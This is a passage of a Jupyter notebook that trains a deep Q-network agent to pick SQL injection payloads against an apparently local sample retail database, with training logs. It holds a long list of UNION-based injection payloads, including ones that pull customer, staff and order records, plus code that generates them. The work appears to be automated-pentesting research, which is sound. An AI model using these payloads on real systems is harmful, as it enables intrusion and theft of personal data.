       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX'#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \"' UNION SELECT category_id, category_name, NULL, NULL, NULL, NULL FROM production.categories--\",\n",
       " \"' UNION SELECT brand_id, brand_name, NULL, NULL, NULL, NULL FROM production.brands--\",\n",
       " \"' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\n",
       " \"' UNION SELECT customer_id, first_name, last_name, phone, email, street FROM sales.customers--\",\n",
       " \"' UNION SELECT store_id, store_name, phone, email, street, city FROM sales.stores--\",\n",
       " \"' UNION SELECT staff_id, first_name, last_name, email, phone, active FROM sales.staffs--\",\n",
       " \"' UNION SELECT order_id, customer_id, order_status, order_date, required_date, shipped_date FROM sales.orders--\",\n",
       " \"' UNION SELECT order_id, item_id, product_id, quantity, list_price, discount FROM sales.order_items--\",\n",
       " \"' UNION SELECT store_id, product_id, quantity, NULL, NULL, NULL FROM production.stocks--\",\n",
       " \"' UNION SELECT category_id, category_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM production.categories--\",\n",
       " \"' UNION SELECT brand_id, brand_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM production.brands--\",\n",
       " \"' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price, NULL, NULL, NULL FROM production.products--\",\n",
       " \"' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\",\n",
       " \"' UNION SELECT store_id, store_name, phone, email, street, city, state, zip_code, NULL FROM sales.stores--\",\n",
       " \"' UNION SELECT staff_id, first_name, last_name, email, phone, active, store_id, manager_id, NULL FROM sales.staffs--\",\n",
       " \"' UNION SELECT order_id, customer_id, order_status, order_date, required_date, shipped_date, store_id, staff_id, NULL FROM sales.orders--\",\n",
       " \"' UNION SELECT order_id, item_id, product_id, quantity, list_price, discount, NULL, NULL, NULL FROM sales.order_items--\",\n",
       " \"' UNION SELECT store_id, product_id, quantity, NULL, NULL, NULL, NULL, NULL, NULL FROM production.stocks--\"]"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Payloads extracted from generic error and union sections from: https://github.com/payloadbox/sql-injection-payload-list\n",
    "# TODO: Remove non-MSSQL payloads.\n",
    "payloads = open('sqli_payloads.txt', 'r').read().split('\\n')\n",
    "\n",
    "for context_col_count in context_col_counts:\n",
    "    for i in range(0, len(tables)):\n",
    "        payload = '\\' UNION SELECT '\n",
    "        table = tables[i]\n",
    "        table_columns = columns[i]\n",
    "        table_col_count = len(table_columns)\n",
    "\n",
    "        for i in range(0, context_col_count):\n",
    "            if i < table_col_count:\n",
    "                payload += table_columns[i]\n",
    "            else:\n",
    "                payload += 'NULL'\n",
    "            if i < context_col_count - 1:\n",
    "                payload += ', '\n",
    "        \n",
    "        payload += f' FROM {table}--'\n",
    "        payloads.append(payload)\n",
    "\n",
    "payloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Link SQL Injection Attacks to Action Space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [],
   "source": [
    "reward_success = 1\n",
    "reward_end = 10\n",
    "reward_norm = 0\n",
    "# Reward for invalid action.\n",
    "reward_mask = -1\n",
    "\n",
    "# Perfoms an SQL injection attack based on an index from the list of payloads.\n",
    "def perform_action(payload_index):\n",
    "    payload = payloads[payload_index]\n",
    "    reward = reward_norm\n",
    "    episode_over = False\n",
    "\n",
    "    try:\n",
    "        df = inject_payload(payload, context)\n",
    "        # Check episode termination condition, and if true, apply appropriate reward.\n",
    "        # An episode will terminate once the goal of the final context is reached.\n",
    "        # TODO: Ensure tables are filtered as the same column name could exist in another table.\n",
    "\n",
    "        #for column in context['column_filter']:\n",
    "        #    if column in df and context['goal'] in df[column].values:\n",
    "\n",
    "        if context['goal'] in df.values:\n",
    "            if context_index < len(contexts) - 1:\n",
    "                reward = reward_success\n",
    "                increment_context()\n",
    "            else:\n",
    "                reward = reward_end\n",
    "                episode_over = True\n",
    "\n",
    "        res = df.to_csv()\n",
    "        has_error = False\n",
    "    except:\n",
    "        # Record error as a String.\n",
    "        res = str(sys.exc_info()[1])\n",
    "        has_error = True\n",
    "    \n",
    "    res = bytearray(res, 'ascii')\n",
    "    res = hashlib.md5(res).digest()\n",
    "    res = list(res)\n",
    "\n",
    "    # Add error information if this is set.\n",
    "    if mark_error:\n",
    "        res.append(int(has_error))\n",
    "\n",
    "    res = np.array(res, dtype='float32')\n",
    "\n",
    "    return res, reward, episode_over"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "DQN (Adapted from https://keras.io/examples/rl/deep_q_network_breakout/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [],
   "source": [
    "gamma = 0.99  # Discount factor for past rewards\n",
    "starting_epsilon = 1.0\n",
    "epsilon = starting_epsilon  # Epsilon greedy parameter\n",
    "epsilon_min = 0.1 # Minimum epsilon greedy parameter\n",
    "epsilon_max = 1.0  # Maximum epsilon greedy parameter\n",
    "epsilon_interval = (\n",
    "    epsilon_max - epsilon_min\n",
    ")  # Rate at which to reduce chance of random action being taken\n",
    "learning_rate = 0.00025\n",
    "batch_size = 32  # Size of batch taken from replay buffer\n",
    "max_steps_per_episode = 10000\n",
    "training_episodes = 100\n",
    "test_episodes = 10\n",
    "episodes = training_episodes + test_episodes\n",
    "\n",
    "num_actions = len(payloads)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"model_5\"\n",
      "_________________________________________________________________\n",
      " Layer (type)                Output Shape              Param #   \n",
      "=================================================================\n",
      " input_6 (InputLayer)        [(32, 17, 1)]             0         \n",
      "                                                                 \n",
      " conv1d_15 (Conv1D)          (32, 5, 32)               64        \n",
      "                                                                 \n",
      " conv1d_16 (Conv1D)          (32, 3, 64)               2112      \n",
      "                                                                 \n",
      " conv1d_17 (Conv1D)          (32, 3, 64)               4160      \n",
      "                                                                 \n",
      " flatten_5 (Flatten)         (32, 192)                 0         \n",
      "                                                                 \n",
      " dense_10 (Dense)            (32, 512)                 98816     \n",
      "                                                                 \n",
      " dense_11 (Dense)            (32, 500)                 256500    \n",
      "                                                                 \n",
      "=================================================================\n",
      "Total params: 361,652\n",
      "Trainable params: 361,652\n",
      "Non-trainable params: 0\n",
      "_________________________________________________________________\n"
     ]
    }
   ],
   "source": [
    "def create_q_model(batch_size):\n",
    "    # Network defined by the Deepmind paper\n",
    "    inputs = layers.Input(shape=(features, 1), batch_size=batch_size)\n",
    "\n",
    "    # Convolutions on the frames on the screen\n",
    "    layer1 = layers.Conv1D(32, 1, strides=4, activation=\"relu\")(inputs)\n",
    "    layer2 = layers.Conv1D(64, 1, strides=2, activation=\"relu\")(layer1)\n",
    "    layer3 = layers.Conv1D(64, 1, strides=1, activation=\"relu\")(layer2)\n",
    "\n",
    "    layer4 = layers.Flatten()(layer3)\n",
    "\n",
    "    layer5 = layers.Dense(512, activation=\"relu\")(layer4)\n",
    "    action = layers.Dense(num_actions, activation=\"linear\")(layer5)\n",
    "\n",
    "    return keras.Model(inputs=inputs, outputs=action)\n",
    "\n",
    "# The first model makes the predictions for Q-values which are used to\n",
    "# make an action.\n",
    "model = create_q_model(1)\n",
    "model.compile(optimizer='adam')\n",
    "# Build a target model for the prediction of future rewards.\n",
    "# The weights of a target model get updated every 10000 steps thus when the\n",
    "# loss between the Q-values is calculated the target Q-value is stable.\n",
    "model_target = create_q_model(batch_size)\n",
    "model_target.compile(optimizer='adam')\n",
    "model_target.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [],
   "source": [
    "class EpisodeAnalytics:\n",
    "    def __init__(self):\n",
    "        self.actions = []\n",
    "        self.attempts = []\n",
    "        self.timings = []\n",
    "    \n",
    "    def record_success(self, action, num_actions_attempted, time_taken):\n",
    "        self.actions.append(action)\n",
    "        self.attempts.append(num_actions_attempted)\n",
    "        self.timings.append(time_taken)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "class DQNAnalytics:\n",
    "    def __init__(self):\n",
    "        self.episode_data = []\n",
    "\n",
    "    def begin_episode(self):\n",
    "        self.episode_data.append(EpisodeAnalytics())\n",
    "        self.start_time = time.time_ns()\n",
    "        self.attempts = 0\n",
    "\n",
    "    def add_attempt(self):\n",
    "        self.attempts += 1\n",
    "\n",
    "    def record_success(self, action):\n",
    "        time_taken = time.time_ns() - self.start_time\n",
    "        self.episode_data[len(self.episode_data)-1] \\\n",
    "            .record_success(action, self.attempts, time_taken)\n",
    "        self.attempts = 0\n",
    "\n",
    "    def _get_episodes_array(self):\n",
    "        return [i for i in range(1, episodes+1)]\n",
    "\n",
    "    def _plot_remainder_and_show(self):\n",
    "        plt.title(f'γ = {gamma}, ε ∈ [{epsilon_min}, {epsilon_max}] Starting at ε = {starting_epsilon}, α = {learning_rate}')\n",
    "        plt.xlabel('Episode')\n",
    "        plt.axvline(x=training_episodes, color='m', label = 'Training End', linestyle='--')\n",
    "        plt.legend()\n",
    "        plt.show()\n",
    "    \n",
    "    def plot_avg_attempts(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        avg_attempts = [np.average(ed.attempts) if len(ed.attempts) != 0 else None for ed in self.episode_data]\n",
    "        plt.scatter(episodes, avg_attempts, marker='^')\n",
    "        plt.suptitle('Average Attempts for Goals Found per Episode')\n",
    "        plt.ylabel('Average Attempts')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_context_attempts(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        for i in range(0, len(contexts)):\n",
    "            context_attempts = [ed.attempts[i] if i < len(ed.attempts) else None for ed in self.episode_data]\n",
    "            plt.scatter(episodes, context_attempts, label=f'Context {i+1}', marker='^')\n",
    "        plt.suptitle('Attempts per Goal Found per Episode')\n",
    "        plt.ylabel('Attempts')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_avg_timings(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        avg_timings = [np.average(ed.timings)/1000000000 if len(ed.timings) != 0 else None for ed in self.episode_data]\n",
    "        plt.scatter(episodes, avg_timings, marker='^')\n",
    "        plt.suptitle('Average Time Taken in Seconds for Goals Found per Episode')\n",
    "        plt.ylabel('Average Time Taken (s)')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_context_timings(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        for i in range(0, len(contexts)):\n",
    "            context_timings = [ed.timings[i]/1000000000 if i < len(ed.timings) else None for ed in self.episode_data]\n",
    "            plt.scatter(episodes, context_timings, label=f'Context {i+1}', marker='^')\n",
    "        plt.suptitle('Time Taken in Seconds per Goals Found per Episode')\n",
    "        plt.ylabel('Time Taken (s)')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def get_test_payloads(self):\n",
    "        indices = []\n",
    "        episode_actions = []\n",
    "        for i in range(training_episodes, episodes):\n",
    "            indices.append(f'Episode {i+1}')\n",
    "            curr_episode_data = self.episode_data[i]\n",
    "            curr_episode_actions = [payloads[curr_episode_data.actions[j]] if j < len(curr_episode_data.actions) else 'N/A' for j in range(len(contexts))]\n",
    "            episode_actions.append(curr_episode_actions)\n",
    "        \n",
    "        column_names = [f'Context {i+1}' for i in range(len(contexts))]\n",
    "        columns = [[] for i in range(len(contexts))]\n",
    "        for actions in episode_actions:\n",
    "            for i in range(len(actions)):\n",
    "                columns[i].append(actions[i])\n",
    "\n",
    "        table = {}\n",
    "        for i in range(len(contexts)):\n",
    "            table[column_names[i]] = columns[i]\n",
    "\n",
    "        df = pd.DataFrame(table, index=indices)\n",
    "        return df\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create All Possible Payloads (Action Space)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_empty_state():\n",
    "    return np.array([0] * features, dtype='float32')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 1\t Frame count: 100\t Context: 1\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 1\t Frame count: 300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 1\t Frame count: 400\t Context: 1\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 500\t Context: 2\n",
      "Running reward: 11.00\t Episode 3\t Frame count: 600\t Context: 1\n",
      "Running reward: 11.00\t Episode 3\t Frame count: 700\t Context: 1\n",
      "Running reward: 11.00\t Episode 4\t Frame count: 800\t Context: 1\n",
      "Running reward: 11.00\t Episode 4\t Frame count: 900\t Context: 2\n",
      "Running reward: 11.00\t Episode 5\t Frame count: 1000\t Context: 1\n",
      "Running reward: 11.00\t Episode 5\t Frame count: 1100\t Context: 2\n",
      "Running reward: 11.00\t Episode 5\t Frame count: 1200\t Context: 2\n",
      "Running reward: 11.00\t Episode 5\t Frame count: 1300\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1400\t Context: 1\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1500\t Context: 1\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1600\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1700\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1800\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 1900\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 2000\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 2100\t Context: 2\n",
      "Running reward: 11.00\t Episode 6\t Frame count: 2200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 2300\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2400\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 2600\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2700\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2800\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 2900\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3000\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 3200\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3300\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3400\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3500\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
